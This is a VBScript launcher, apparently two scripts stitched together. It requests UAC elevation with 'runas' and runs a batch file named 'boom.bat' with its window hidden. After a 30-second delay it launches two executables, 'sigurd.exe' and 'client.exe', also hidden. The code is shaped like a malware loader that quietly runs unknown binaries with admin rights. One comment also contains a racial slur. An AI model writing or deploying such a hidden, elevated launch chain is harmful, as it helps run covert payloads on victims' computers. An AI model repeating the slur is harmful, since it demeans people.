Set UAC = CreateObject("Shell.Application")
Set WshShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FileSystemObject")

' Set working directory to the current folder
strPath = FSO.GetParentFolderName(WScript.ScriptFullName)
WshShell.CurrentDirectory = strPath

' --- STEP 1: ELEVATION ---
If Not WScript.Arguments.Named.Exists("elevate") Then
    ' Trigger UAC prompt. 0 = Hidden, 1 = Visible (use 1 for testing)
    UAC.ShellExecute "wscript.exe", Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevate", "", "runas", 1
    WScript.Quit
End If

' --- STEP 2: START THE CHAIN ---
' Runs boom.bat completely hidden (0)

WshShell.Run "cmd.exe /c boom.bat", 0, True

Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' 1. Wait 30 seconds to make sure Windows is ready
WScript.Sleep 30000 

' 2. Automatically find the folder where this script is sitting
' This avoids any "path mistakes"
strPath = fso.GetParentFolderName(WScript.ScriptFullName)

' 3. Run your files (0 = hidden, False = don't wait for it to finish)
' The Triple Quotes handles spaces in your username "nigga12"
WshShell.Run """" & strPath & "\sigurd.exe""", 0, False
WshShell.Run """" & strPath & "\client.exe""", 0, False

' Add any other files below using the same format:
' WshShell.Run """" & strPath & "\yourfile.exe""", 0, False
